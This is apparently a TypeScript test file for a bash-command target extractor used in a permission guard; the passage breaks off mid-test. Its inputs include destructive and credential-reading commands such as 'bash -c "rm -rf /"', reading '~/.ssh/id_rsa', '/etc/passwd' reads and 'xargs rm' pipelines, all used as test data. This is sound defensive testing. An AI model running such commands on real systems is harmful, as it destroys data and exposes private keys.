//
// TDD RED: bash-target-extraction tests. Covers BT1-BT12.
//
// --- Test-ID hygiene note (Phase 10.4e) ---
//
// `BT-B*` test IDs in this file are NOT globally unique. Multiple phases of
// the same change (`bash-stage-b-security-fixes`) reused numbers because
// each phase was planned independently. Specifically:
//
//   - `BT-B7`/`BT-B15`/`BT-B21` each appear 2x (helper-layer unit vs
//     main-flow integration tests, same phase).
//   - `BT-B14` appears 17x and `BT-B17` 16x (BT-B14x..BT-B14y, BT-B17x..
//     BT-B17y suffixes accumulate across BT-B14..BT-B21 sub-scenarios).
//   - `BT-B16`/`BT-B18`/`BT-B19` appear 6-8x each (Phase-1 helpers +
//     Phase-2 redirect + Phase-3 shell-forwarder scenarios with the same
//     base number).
//
// Look up by test title substring (e.g. `--test-name-pattern="BT-B19 bash"`)
// or by line number; do NOT assume a bare `BT-B19` refers to one test.
// We deliberately kept the historical numbering to preserve audit-trail
// references from proposal.md/design.md/tasks.md (all of which reference
// specific BT-B* IDs by number); renumbering would require updating ~200
// references and provide no functional gain.
//

import { test } from "node:test";
import assert from "node:assert/strict";

import { extractBashTargets } from "../src/lib/bash-extract/index.ts";
import {
  FIND_WRITE_FLAGS,
  isFindReadOnly,
  isReadOnlyWithArgs,
  isDevSocketOrFd,
  isForwarderStageSafe,
} from "../src/lib/bash-extract/index.ts";

// -------- BT1: rm -rf extraction --------

test("BT1: extracts_target_from_rm_rf", () => {
  const result = extractBashTargets("rm -rf /tmp/build", "/proj");
  assert.equal(result.reliable, true);
  if (result.reliable) {
    const targets = result.targets;
    assert.ok(targets.some((t) => t.path === "/tmp/build" && (t.action === "write" || t.action === "delete")));
  }
});

test("BT1b: extracts_target_from_rm_plain", () => {
  const result = extractBashTargets("rm /tmp/x.txt", "/proj");
  assert.equal(result.reliable, true);
  if (result.reliable) {
    assert.ok(result.targets.some((t) => t.path === "/tmp/x.txt"));
  }
});

// -------- BT2: mv destination --------

test("BT2: extracts_target_from_mv_destination", () => {
  const result = extractBashTargets("mv /tmp/a.txt /dest/b.txt", "/proj");
  assert.equal(result.reliable, true);
  if (result.reliable) {
    assert.ok(result.targets.some((t) => t.path === "/dest/b.txt" && t.action === "write"));
    assert.ok(result.targets.some((t) => t.path === "/tmp/a.txt" && t.action === "read"));
  }
});

// -------- BT3: cat source --------

test("BT3: extracts_source_from_cat", () => {
  const result = extractBashTargets("cat /etc/passwd", "/proj");
  assert.equal(result.reliable, true);
  if (result.reliable) {
    assert.ok(result.targets.some((t) => t.path === "/etc/passwd" && t.action === "read"));
  }
});

// -------- BT4: redirection --------

test("BT4: extracts_target_from_redirection_operator", () => {
  const result = extractBashTargets("echo foo > /tmp/out.txt", "/proj");
  assert.equal(result.reliable, true);
  if (result.reliable) {
    assert.ok(result.targets.some((t) => t.path === "/tmp/out.txt" && t.action === "write"));
  }

  // Append redirection
  const result2 = extractBashTargets("echo foo >> /tmp/log.txt", "/proj");
  assert.equal(result2.reliable, true);
  if (result2.reliable) {
    assert.ok(result2.targets.some((t) => t.path === "/tmp/log.txt" && t.action === "write"));
  }
});

// -------- BT5: curl -o --------

test("BT5: extracts_target_from_curl_output_flag", () => {
  const result = extractBashTargets("curl https://x.com/a -o /tmp/a.bin", "/proj");
  assert.equal(result.reliable, true);
  if (result.reliable) {
    assert.ok(result.targets.some((t) => t.path === "/tmp/a.bin" && t.action === "write"));
    // URL should not be in targets
    assert.ok(!result.targets.some((t) => t.path === "https://x.com/a"));
  }
});

// -------- BT6: $HOME expansion --------

test("BT6: expands_HOME_variable", () => {
  process.env.HOME = "/Users/eliot";
  const result = extractBashTargets("cat $HOME/.ssh/id_rsa", "/proj");
  assert.equal(result.reliable, true);
  if (result.reliable) {
    assert.ok(result.targets.some((t) => t.path === "/Users/eliot/.ssh/id_rsa"));
  }
});

// -------- BT7: unknown variable makes it unreliable --------

test("BT7: unknown_variable_marks_extraction_unreliable", () => {
  const result = extractBashTargets("cat $MYSECRETS", "/proj");
  assert.equal(result.reliable, false);
  if (!result.reliable) {
    assert.ok(result.rawCommand.includes("$MYSECRETS"));
  }
});

// -------- BT8: pipeline makes it unreliable --------

// BT8 (reversed in change bash-pipeline-extract): pipeline now parses into
// independent stages. `cat /etc/passwd | grep root` should be reliable and
// extract the read target from `cat`.
test("BT8: pipeline_is_reliable_and_extracts_stages", () => {
  const result = extractBashTargets("cat /etc/passwd | grep root", "/proj");
  assert.equal(result.reliable, true);
  if (result.reliable) {
    assert.ok(
      result.targets.some((t) => t.path === "/etc/passwd" && t.action === "read"),
      `should extract /etc/passwd as read; got: ${JSON.stringify(result.targets)}`,
    );
  }
});

// -------- BT9: command substitution makes it unreliable --------

test("BT9: command_substitution_marks_extraction_unreliable", () => {
  const result = extractBashTargets("rm -rf $(cat /etc/hosts)", "/proj");
  assert.equal(result.reliable, false);
});

// -------- BT10: relative path resolution --------

test("BT10: resolves_relative_path_against_project_root", () => {
  const result = extractBashTargets("cat src/main.ts", "/proj");
  assert.equal(result.reliable, true);
  if (result.reliable) {
    assert.ok(result.targets.some((t) => t.path === "/proj/src/main.ts"));
  }
});

// -------- BT11: multi-target chained commands --------

test("BT11: extracts_multiple_targets_from_chained_commands", () => {
  const result = extractBashTargets("cp /a /b && cp /c /d", "/proj");
  assert.equal(result.reliable, true);
  if (result.reliable) {
    // 4 targets total (2 reads + 2 writes)
    assert.ok(result.targets.some((t) => t.path === "/a" && t.action === "read"));
    assert.ok(result.targets.some((t) => t.path === "/b" && t.action === "write"));
    assert.ok(result.targets.some((t) => t.path === "/c" && t.action === "read"));
    assert.ok(result.targets.some((t) => t.path === "/d" && t.action === "write"));
  }
});

// -------- BT12: unreliable result includes raw command --------

test("BT12: unreliable_result_includes_raw_command", () => {
  // Note: pipelines are no longer unreliable (see BT8 reversed). Use
  // command substitution instead — that's still unreliable.
  const cmd = "rm -rf $(cat /etc/passwd)";
  const result = extractBashTargets(cmd, "/proj");
  assert.equal(result.reliable, false);
  if (!result.reliable) {
    assert.equal(result.rawCommand, cmd);
  }
});

// -------- Extra: subshell, process substitution, heredoc --------

test("BT-extra: subshell marks unreliable", () => {
  assert.equal(extractBashTargets("(cat /etc/passwd)", "/proj").reliable, false);
});

test("BT-extra: process substitution marks unreliable", () => {
  assert.equal(extractBashTargets("diff <(cat a) <(cat b)", "/proj").reliable, false);
});

test("BT-extra: heredoc marks unreliable", () => {
  assert.equal(extractBashTargets("cat <<EOF\nhello\nEOF", "/proj").reliable, false);
});

// -------- Security regression tests (from code review Issues 1 & 2) --------

test("BT-extra: glob in target marks unreliable (security: bash glob false-allow)", () => {
  // `rm -rf /etc/*.log` should be flagged unreliable - we can't enumerate
  // which files the shell glob will expand to.
  const result = extractBashTargets("rm -rf /etc/*.log", "/proj");
  assert.equal(result.reliable, false);
  if (!result.reliable) {
    assert.ok(
      result.reason?.includes("glob") || result.reason?.includes("Glob"),
      `reason should mention glob, got: ${result.reason}`,
    );
  }
});

test("BT-extra: glob in redirect target marks unreliable", () => {
  const result = extractBashTargets("cat /etc/* > /tmp/out.txt", "/proj");
  assert.equal(result.reliable, false);
});

test("BT-extra: quoted glob is now reliable (quote-aware scanner treats as literal)", () => {
  // Under the new quote-aware scanner, both single-quoted and double-quoted
  // glob metacharacters are literal—bash itself won't expand them either.
  // Single quotes: no expansion ever.
  assert.equal(extractBashTargets('rm -rf \'/etc/*.log\'', "/proj").reliable, true);
  // Double quotes: bash also does not expand glob inside double quotes.
  const r = extractBashTargets('rm -rf "/etc/*.log"', "/proj");
  assert.equal(r.reliable, true);
  // Note: `rm -rf "/etc/*.log"` will still delete the literal file
  // `/etc/*.log` if it exists. The literal path is extracted as a delete
  // target, which is the correct behavior.
});

test("BT-extra: indirect expansion ${!VAR} marks unreliable (security)", () => {
  // `x=/etc/passwd; v=x; cat ${!v}` - bash indirect expansion.
  // Without this check, findUnresolvedVariable only matches uppercase
  // vars without braces, so `cat ${!v}` passes and 0 targets are extracted.
  const result = extractBashTargets("x=/etc/passwd; v=x; cat ${!v}", "/proj");
  assert.equal(result.reliable, false);
});

test("BT-extra: arithmetic $((...)) marks unreliable (security)", () => {
  // `$(( ))` bash arithmetic - can't be resolved statically.
  const result = extractBashTargets("echo $((1+1)) > /etc/secret.txt", "/proj");
  assert.equal(result.reliable, false);
});

test("BT-extra: lowercase user variable marks unreliable (security)", () => {
  // Historically we only caught UPPERCASE user vars. Now lowercase too.
  const result = extractBashTargets("cat $mysecret", "/proj");
  assert.equal(result.reliable, false);
});

test("BT-extra: special param $@ marks unreliable (security)", () => {
  const result = extractBashTargets("cat $@", "/proj");
  assert.equal(result.reliable, false);
});

// -------- Extra: safe commands that don't access files --------

test("BT-extra: harmless command returns no targets but reliable", () => {
  const result = extractBashTargets("ls -la", "/proj");
  assert.equal(result.reliable, true);
  if (result.reliable) {
    // No file targets
    assert.equal(result.targets.length, 0);
  }
});

// -------- Extra: chmod / chown metadata writes --------

test("BT-extra: chmod / chown targets", () => {
  const r1 = extractBashTargets("chmod 600 /tmp/x", "/proj");
  assert.equal(r1.reliable, true);
  if (r1.reliable) {
    assert.ok(r1.targets.some((t) => t.path === "/tmp/x"));
  }
  const r2 = extractBashTargets("chown eliot /tmp/y", "/proj");
  assert.equal(r2.reliable, true);
  if (r2.reliable) {
    assert.ok(r2.targets.some((t) => t.path === "/tmp/y"));
  }
});

// -------- Extra: dd of= --------

test("BT-extra: dd of=", () => {
  const result = extractBashTargets("dd if=/dev/zero of=/tmp/out bs=1M count=10", "/proj");
  assert.equal(result.reliable, true);
  if (result.reliable) {
    assert.ok(result.targets.some((t) => t.path === "/tmp/out"));
    // /dev/zero should not be treated as a filesystem target (or if it is, it's a read)
  }
});

// -------- BT-extra-ls: ls/find/tree etc. are read-only enumeration commands --------

test("BT-extra: ls extracts paths as read targets", () => {
  const r = extractBashTargets("ls /tmp/foo/bar", "/proj");
  assert.equal(r.reliable, true);
  assert.equal((r as any).targets.length, 1);
  assert.equal((r as any).targets[0].action, "read");
  assert.equal((r as any).targets[0].path, "/tmp/foo/bar");
});

test("BT-extra: quoted glob is now reliable (quote-aware scanner treats as literal)", () => {
  // Under the new quote-aware scanner, both single-quoted and double-quoted
  // glob metacharacters are literal—bash itself won't expand them either.
  // Single quotes: no expansion ever.
  assert.equal(extractBashTargets('rm -rf \'/etc/*.log\'', "/proj").reliable, true);
  // Double quotes: bash also does not expand glob inside double quotes.
  const r = extractBashTargets('rm -rf "/etc/*.log"', "/proj");
  assert.equal(r.reliable, true);
  // Note: `rm -rf "/etc/*.log"` will still delete the literal file
  // `/etc/*.log` if it exists. The literal path is extracted as a delete
  // target, which is the correct behavior.
});

test("BT-extra: find without glob extracts paths", () => {
  const r = extractBashTargets("find /etc/passwd -type f", "/proj");
  assert.equal(r.reliable, true);
  const reads = (r as any).targets.filter((t: any) => t.action === "read");
  assert.ok(reads.length >= 1, "should extract at least one read target");
});

test("BT-extra: tree/stat/du/df/file/less/more all classified as read", () => {
  for (const cmd of ["tree", "stat", "du", "df", "file", "less", "more"]) {
    const r = extractBashTargets(`${cmd} /tmp/somepath`, "/proj");
    assert.equal(r.reliable, true, `${cmd} should be reliable`);
    const reads = (r as any).targets.filter((t: any) => t.action === "read");
    assert.ok(
      reads.some((t: any) => t.path === "/tmp/somepath"),
      `${cmd} should extract /tmp/somepath as read`,
    );
  }
});

// -------- BT-extra-mkdir: mkdir/touch are writes --------

test("BT-extra: mkdir extracts paths as write targets", () => {
  const r = extractBashTargets("mkdir /tmp/foo/bar", "/proj");
  assert.equal(r.reliable, true);
  const writes = (r as any).targets.filter((t: any) => t.action === "write");
  assert.ok(
    writes.some((t: any) => t.path === "/tmp/foo/bar"),
    "mkdir should extract path as write",
  );
});

test("BT-extra: touch extracts paths as write targets", () => {
  const r = extractBashTargets("touch /tmp/foo.log", "/proj");
  assert.equal(r.reliable, true);
  const writes = (r as any).targets.filter((t: any) => t.action === "write");
  assert.ok(
    writes.some((t: any) => t.path === "/tmp/foo.log"),
    "touch should extract path as write",
  );
});

// -------- BT-extra-test: test/[ existence checks are reads --------

test("BT-extra: test -e PATH extracts as read", () => {
  const r = extractBashTargets("test -e /tmp/x.txt", "/proj");
  assert.equal(r.reliable, true);
  const reads = (r as any).targets.filter((t: any) => t.action === "read");
  assert.ok(
    reads.some((t: any) => t.path === "/tmp/x.txt" && t.action === "read"),
    "test -e should extract path as read",
  );
});

// =========================================================================
// BTP tests (bash-pipeline-extract change)
// =========================================================================

// -------- BTP1: simple pipeline extracts stages --------
test("BTP1: pipeline_stages_are_extracted_independently", () => {
  const r = extractBashTargets("cat /etc/passwd | grep root", "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.ok(
      r.targets.some((t) => t.path === "/etc/passwd" && t.action === "read"),
      `expected /etc/passwd as read; got: ${JSON.stringify(r.targets)}`,
    );
  }
});

// -------- BTP2: filter chain extracts first-stage target --------
test("BTP2: pipeline_filter_chain_extracts_first_stage_target", () => {
  const r = extractBashTargets("find /etc | sort | head -5", "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.ok(
      r.targets.some((t) => t.path === "/etc" && t.action === "read"),
      `expected /etc as read; got: ${JSON.stringify(r.targets)}`,
    );
  }
});

// -------- BTP3: tee in pipeline still extracts write target --------
test("BTP3: tee_in_pipeline_still_extracts_write_target", () => {
  const r = extractBashTargets("echo hi | tee /tmp/log.txt", "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.ok(
      r.targets.some((t) => t.path === "/tmp/log.txt" && t.action === "write"),
      `expected /tmp/log.txt as write; got: ${JSON.stringify(r.targets)}`,
    );
  }
});

// -------- BTP4: quoted pipe not split --------
test("BTP4: quoted_pipe_is_not_split", () => {
  const r = extractBashTargets('echo "a|b" > /tmp/x', "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.ok(
      r.targets.some((t) => t.path === "/tmp/x" && t.action === "write"),
      `expected /tmp/x as write; got: ${JSON.stringify(r.targets)}`,
    );
  }
});

// -------- BTP5: xargs in non-first stage marks unreliable --------
test("BTP5: xargs_in_pipeline_marks_unreliable", () => {
  const r = extractBashTargets("find /etc | xargs rm", "/proj");
  assert.equal(r.reliable, false);
  if (!r.reliable) {
    assert.equal(r.reason, "forwarding_command");
  }
});

// -------- BTP6: parallel in non-first stage marks unreliable --------
test("BTP6: parallel_in_pipeline_marks_unreliable", () => {
  const r = extractBashTargets("cat /tmp/input.txt | parallel -a /tmp/input.txt", "/proj");
  assert.equal(r.reliable, false);
  if (!r.reliable) {
    assert.equal(r.reason, "forwarding_command");
  }
});

// -------- BTP7: xargs without pipe input not flagged --------
test("BTP7: xargs_without_pipe_input_is_not_flagged", () => {
  const r = extractBashTargets("echo hi; xargs --help", "/proj");
  assert.equal(r.reliable, true);
});

// -------- BTP8: other unreliable patterns still work --------
test("BTP8: other_unreliable_patterns_still_mark_unreliable", () => {
  // Command substitution outside quotes
  assert.equal(extractBashTargets("rm -rf $(cat /etc/hosts)", "/proj").reliable, false);
  // Backtick outside quotes
  assert.equal(extractBashTargets("rm -rf `cat /etc/hosts`", "/proj").reliable, false);
  // Process substitution
  assert.equal(extractBashTargets("diff <(cat a) <(cat b)", "/proj").reliable, false);
  // Heredoc
  assert.equal(extractBashTargets("cat <<EOF\nhello\nEOF", "/proj").reliable, false);
});

// -------- BTP9: logical operators not pipelines --------
test("BTP9: logical_or_and_and_are_not_pipelines", () => {
  const r = extractBashTargets("ls /a || ls /b", "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.ok(
      r.targets.some((t) => t.path === "/a" && t.action === "read"),
      `expected /a as read; got: ${JSON.stringify(r.targets)}`,
    );
    assert.ok(
      r.targets.some((t) => t.path === "/b" && t.action === "read"),
      `expected /b as read; got: ${JSON.stringify(r.targets)}`,
    );
  }
});

// -------- BTP10: |& pipe stderr extension splits as pipeline --------
test("BTP10: pipe_stderr_extension_splits_like_pipeline", () => {
  const r = extractBashTargets("echo err >&2 | tee /tmp/x", "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.ok(
      r.targets.some((t) => t.path === "/tmp/x" && t.action === "write"),
      `expected /tmp/x as write; got: ${JSON.stringify(r.targets)}`,
    );
  }
});

// -------- BTP11: escaped pipe in double quotes not unreliable --------
test("BTP11: quoted_pipe_escape_not_unreliable", () => {
  const r = extractBashTargets('grep -n "FAIL\\|error" file.ts', "/proj");
  assert.equal(r.reliable, true);
});

// -------- BTP12: double-quoted literal with glob char not unreliable --------
test("BTP12: double_quoted_literal_not_unreliable", () => {
  const r = extractBashTargets('grep -oE \'"id":"[^"]*"\' file.json', "/proj");
  assert.equal(r.reliable, true);
});

// -------- BTP13: single-quoted pipe literal not split --------
test("BTP13: single_quoted_literal_pipe_not_split", () => {
  const r = extractBashTargets("echo 'a|b'", "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.equal(r.targets.length, 0, "no path targets expected for echo literal");
  }
});

// -------- BTP14: unquoted command substitution still unreliable --------
test("BTP14: unquoted_command_substitution_still_unreliable", () => {
  const r = extractBashTargets("echo $(cat /etc/passwd)", "/proj");
  assert.equal(r.reliable, false);
});

// -------- BTP15: escaped $ in double quotes not unreliable --------
test("BTP15: escaped_dollar_in_double_quote_not_unreliable", () => {
  const r = extractBashTargets('echo "x\\$(cat /etc/passwd)"', "/proj");
  assert.equal(r.reliable, true);
});

// -------- BTP16: regex pipe in quotes preserves target extraction --------
test("BTP16: regex_pipe_in_quotes_preserves_target_extraction", () => {
  const r = extractBashTargets('grep -E "foo|bar" /etc/passwd', "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.ok(
      r.targets.some((t) => t.path === "/etc/passwd" && t.action === "read"),
      `expected /etc/passwd as read; got: ${JSON.stringify(r.targets)}`,
    );
  }
});

// -------- BTP17: git log pipeline with regex pipe is silent --------
test("BTP17: git_log_pipeline_with_regex_pipe_silent", () => {
  const r = extractBashTargets('git log --oneline | grep -E "foo|bar"', "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    // git is in SILENT_COMMANDS so no read target from it; grep -E with only
    // pattern arg (no file) also produces no target.
    assert.equal(r.targets.length, 0, `expected no targets (git silent, grep pattern-only); got: ${JSON.stringify(r.targets)}`);
  }
});

// -------- BTP18: npm test silent --------
test("BTP18: silent_command_npm_test_returns_zero_targets", () => {
  const r = extractBashTargets("npm test", "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.equal(r.targets.length, 0);
  }
});

// -------- BTP19: git read-only commands silent --------
test("BTP19: silent_command_git_read_only_silent", () => {
  for (const cmd of ["git log --oneline -n 10", "git status", "git rev-list HEAD"]) {
    const r = extractBashTargets(cmd, "/proj");
    assert.equal(r.reliable, true, `${cmd} should be reliable`);
    if (r.reliable) {
      assert.equal(r.targets.length, 0, `${cmd} should have zero targets (git silent)`);
    }
  }
});

// -------- BTP20: openspec status silent --------
test("BTP20: silent_command_openspec_silent", () => {
  const r = extractBashTargets("openspec status --change foo --json", "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.equal(r.targets.length, 0);
  }
});

// -------- BTP21: rm stays in COMMAND_TABLE --------
test("BTP21: rm_still_extracted_not_silent", () => {
  const r = extractBashTargets("rm -rf /tmp/build", "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.ok(
      r.targets.some((t) => t.path === "/tmp/build" && t.action === "delete"),
      `expected /tmp/build as delete; got: ${JSON.stringify(r.targets)}`,
    );
  }
});

// -------- BTP22: SILENT does not mask forwarder --------
test("BTP22: silent_command_does_not_mask_forwarder", () => {
  const r = extractBashTargets("git ls-files | xargs rm", "/proj");
  assert.equal(r.reliable, false);
  if (!r.reliable) {
    assert.equal(r.reason, "forwarding_command");
  }
});

// -------- Audit regression tests (real patterns from permission-review.jsonl) --------

// Real audit #97: contains $(grep ...) command substitution → SHOULD still prompt.
test("BTP-audit-97: shell_command_substitution_still_triggers_prompt", () => {
  const cmd = `cd /proj && echo "count: $(grep -c 'X' file.md)"`;
  const r = extractBashTargets(cmd, "/proj");
  assert.equal(r.reliable, false);
  if (!r.reliable) {
    assert.equal(r.reason, "command_substitution");
  }
});

// Real audit #102: npm test | grep ... | tail (with no $(...)) → SHOULD be silent.
// bash-hardening-round-2 L3: the compound command now starts with `cd /proj`,
// so static analysis of the relative paths in the downstream pipeline is not
// safe — `cd /proj && npm test | grep ... | tail` reports `cd_chdir` rather
// than silently extracting the pipeline's downstream targets. This is the
// intentional UX narrowing documented in proposal.md caller-impact analysis
// (BTP-audit-102: "现按 L3 新规则应判 cd_chdir unreliable, 原断言 reliable:
// true 需改为 reliable: false；这是有意的 UX 收窄, 不是 bug").
test("BTP-audit-102: npm_test_pipe_chain_cd_triggers_cd_chdir", () => {
  const cmd = `cd /proj && npm test 2>&1 | grep -E "^ *[✓✖]|pass|fail" | tail -20`;
  const r = extractBashTargets(cmd, "/proj");
  assert.equal(r.reliable, false, "compound cd fragment now flags cd_chdir");
  if (!r.reliable) {
    assert.equal(r.reason, "cd_chdir");
  }
});

// Real audit #17: grep -rn "..." /path/*.md | head — the `*.md` glob is
// UNQUOTED in the real command (only the search pattern is quoted), so it
// correctly triggers glob_expansion. That's the conservative right behavior:
// unquoted globs expand to unknown filenames.
test("BTP-audit-17: unquoted_glob_in_grep_path_still_triggers_prompt", () => {
  const cmd = 'grep -rn "mimo\\|deprecated\\|410" /docs/*.md | head -60';
  const r = extractBashTargets(cmd, "/proj");
  assert.equal(r.reliable, false);
  if (!r.reliable) {
    assert.equal(r.reason, "glob_expansion");
  }
});

// Real audit: `echo "$(<cmd>)"` — $() inside double quotes IS a command substitution.
test("BTP-audit-quote: dollar_paren_inside_double_quotes_still_unreliable", () => {
  const cmd = `echo "$(grep -c 'X' file.md)"`;
  const r = extractBashTargets(cmd, "/proj");
  assert.equal(r.reliable, false);
  if (!r.reliable) {
    assert.equal(r.reason, "command_substitution");
  }
});

// Regression: `x=/etc/passwd; v=x; cat ${!v}` — indirect variable expansion.
test("BTP-audit: indirect_variable_expansion_still_unreliable", () => {
  const r = extractBashTargets("x=/etc/passwd; v=x; cat ${!v}", "/proj");
  assert.equal(r.reliable, false);
});

// -------- BMG1-BMG12: meta commands guard (control flow + shell forwarders) --------
//
// Two silent vulnerabilities from prior change audit:
//   - `bash -c "rm -rf /"` returned {reliable: true, targets: []} — completely silent
//   - `while read x; do cat $x; done` — no control-flow detection
//

test("BMG1: while_keyword_triggers_control_flow", () => {
  const r = extractBashTargets("while read x; do cat $x; done", "/proj");
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "control_flow");
});

test("BMG2: for_keyword_triggers_control_flow", () => {
  // Nested `for` in the body prevents literal-iteration exemption → still
  // control_flow. (Simple single-level `for f in a b; do cat "$f"; done`
  // is now exempted; see BMG79 for the exempted case.)
  const r = extractBashTargets("for f in a b; do for g in c d; do cat \"$g\"; done; done", "/proj");
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "control_flow");
});

test("BMG3: until_keyword_triggers_control_flow", () => {
  const r = extractBashTargets("until ls /; do echo hi; done", "/proj");
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "control_flow");
});

test("BMG4: case_keyword_triggers_control_flow", () => {
  const r = extractBashTargets('case "$x" in a) cat a;; b) cat b;; esac', "/proj");
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "control_flow");
});

test("BMG5: if_keyword_triggers_control_flow", () => {
  // Use `if true` to avoid `[ ... ]` (bash test bracket, which triggers glob).
  const r = extractBashTargets("if true; then cat /etc/passwd; fi", "/proj");
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "control_flow");
});

test("BMG6: control_flow_inside_double_quotes_is_literal", () => {
  // `while` in double quotes is a literal string, not a control flow keyword.
  const r = extractBashTargets('echo "while" && cat /etc/passwd', "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.ok(r.targets.some(t => t.path === "/etc/passwd" && t.action === "read"));
  }
});

test("BMG6b: control_flow_inside_single_quotes_is_literal", () => {
  const r = extractBashTargets("echo 'for' && cat /etc/passwd", "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.ok(r.targets.some(t => t.path === "/etc/passwd" && t.action === "read"));
  }
});

test("BMG7: keyword_as_token_substring_does_not_trigger", () => {
  // `if` in `/tmp/if.txt` is part of a longer token, not a standalone keyword.
  const r = extractBashTargets("cat /tmp/if.txt", "/proj");
  assert.equal(r.reliable, true);
  if (r.reliable) {
    assert.ok(r.targets.some(t => t.path === "/tmp/if.txt" && t.action === "read"));
  }
});

test("BMG8: bash_c_triggers_shell_forwarder", () => {
  // Critical regression: prior change silently allowed `bash -c "rm -rf /"`.
  const r = extractBashTargets('bash -c "rm -rf /"', "/proj");
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "shell_forwarder");
});

test("BMG9: sh_c_triggers_shell_forwarder", () => {
  const r = extractBashTargets('sh -c "cat /etc/passwd"', "/proj");
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "shell_forwarder");
});

test("BMG10: zsh_c_and_dash_c_trigger_shell_forwarder", () => {
  const r1 = extractBashTargets('zsh -c "ls /etc"', "/proj");
  assert.equal(r1.reliable, false);
  if (!r1.reliable) assert.equal(r1.reason, "shell_forwarder");
  const r2 = extractBashTargets('dash -c "echo hi"', "/proj");
  assert.equal(r2.reliable, false);
  if (!r2.reliable) assert.equal(r2.reason, "shell_forwarder");
});

test("BMG11: bash_without_dash_c_is_not_forwarder", () => {
  // BREAKING CHANGE (bash-stage-b-security-fixes): `bash /tmp/x.sh` NOW
  // triggers shell_forwarder — a positional script path is a forwarder
  // because bash executes the script's contents. The legacy "only -c
  // triggers" rule is removed.
  const r = extractBashTargets("bash /tmp/x.sh", "/proj");
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "shell_forwarder");
});

test("BMG11b: bash_version_is_not_forwarder", () => {
  // `bash --version` has no `-c`, so no shell forwarder trigger.
  const r = extractBashTargets("bash --version", "/proj");
  assert.equal(r.reliable, true);
});

test("BMG12: env_bash_c_triggers_shell_forwarder", () => {
  // `env PATH=/usr/bin bash -c "..."` — env is env modifier, bash -c is the actual forwarder.
  const r = extractBashTargets('env PATH=/usr/bin bash -c "cat /etc/passwd"', "/proj");
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "shell_forwarder");
});

test("BMG12b: bash_c_with_x_flag_triggers_shell_forwarder", () => {
  // `bash -xc "..."` — `-xc` is an option cluster containing `c`.
  const r = extractBashTargets('bash -xc "cat /etc/passwd"', "/proj");
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "shell_forwarder");
});

test("BMG13: which_bash_is_not_forwarder", () => {
  // `which bash` — bash is a positional arg, not a command name.
  const r = extractBashTargets("which bash", "/proj");
  assert.equal(r.reliable, true);
});

test("BMG14: bash_c_overrides_silent_and_forwarder_checks", () => {
  // `bash -c "..."` must trigger shell_forwarder even if other checks would allow.
  // (bash is not in SILENT_COMMANDS, but the check must still fire first.)
  const r = extractBashTargets('bash -c "ls /etc"', "/proj");
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "shell_forwarder");
});

// -------- BMG15-BMG24: inert shell special parameters ($? $! $# $$) --------

test("BMG15: dollar_question_mark_exit_status_is_inert", () => {
  // $? is the last exit status — numeric, cannot affect filesystem paths.
  // Must NOT be flagged as "special:?" anymore.
  const r = extractBashTargets('echo "cached_exit=$?"', "/proj");
  assert.equal(r.reliable, true);
});

test("BMG16: git_status_and_cached_exit_check_passes", () => {
  // The original regression: user ran `git status --short && ...; echo $?` and
  // the extractor flagged `unresolved variable: special:?`.
  const cmd = 'git status --short && echo "---" && git diff --cached --quiet; echo "cached_exit=$?"';
  const r = extractBashTargets(cmd, "/proj");
  assert.equal(r.reliable, true);
});

test("BMG17: dollar_bang_last_pid_is_inert", () => {
  // $! is the last background PID — numeric, no path impact.
  const r = extractBashTargets('pid=$!; echo pid', "/proj");
  assert.equal(r.reliable, true);
});

test("BMG18: dollar_hash_arg_count_is_inert", () => {
  // $# is positional arg count — numeric, no path impact.
  const r = extractBashTargets('count=$#; echo count', "/proj");
  assert.equal(r.reliable, true);
});

test("BMG19: dollar_dollar_current_pid_is_inert", () => {
  // $$ is current process PID — numeric, no path impact.
  const r = extractBashTargets('pid=$$; echo pid', "/proj");
  assert.equal(r.reliable, true);
});

test("BMG20: dollar_at_all_args_still_unreliable", () => {
  // $@ can expand to arbitrary paths (positional args), still unreliable.
  const r = extractBashTargets('cat $@', "/proj");
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "unresolved variable: special:@");
});

test("BMG21: dollar_zero_and_positional_args_still_unreliable", () => {
  // $0 and $1 are positional args and can be paths, still unreliable.
  const r0 = extractBashTargets('cat $0', "/proj");
  assert.equal(r0.reliable, false);
  const r1 = extractBashTargets('cat $1', "/proj");
  assert.equal(r1.reliable, false);
});

test("BMG22: dollar_dash_shell_flags_still_unreliable", () => {
  // $- is shell flags — could contain options affecting behavior, still unreliable.
  const r = extractBashTargets('echo $-', "/proj");
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "unresolved variable: special:-");
});

test("BMG23: dollar_question_inside_single_quotes_is_literal", () => {
  // In single quotes `$?` is a literal two-character sequence.
  const r = extractBashTargets("echo 'cached_exit=$?'", "/proj");
  assert.equal(r.reliable, true);
});

// -------- BMG24+: device redirects (fd sinks) --------

test("BMG24: stderr_redirect_to_dev_null_is_not_write_target", () => {
